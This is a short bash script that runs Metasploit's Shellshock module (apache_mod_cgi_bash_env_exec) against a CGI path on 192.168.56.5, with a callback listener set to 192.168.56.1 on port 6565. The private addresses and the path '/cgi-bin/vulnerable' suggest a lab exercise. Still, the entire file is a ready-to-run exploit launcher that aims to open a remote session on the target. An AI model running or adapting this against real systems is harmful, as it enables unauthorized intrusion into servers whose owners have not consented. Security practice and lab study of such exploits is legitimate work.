#!/bin/bash

cd ~/Documents/metasploit-framework

sudo bundle install

./msfconsole -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.56.5; set TARGETURI /cgi-bin/vulnerable; set LHOST 192.168.56.1; set LPORT 6565; exploit"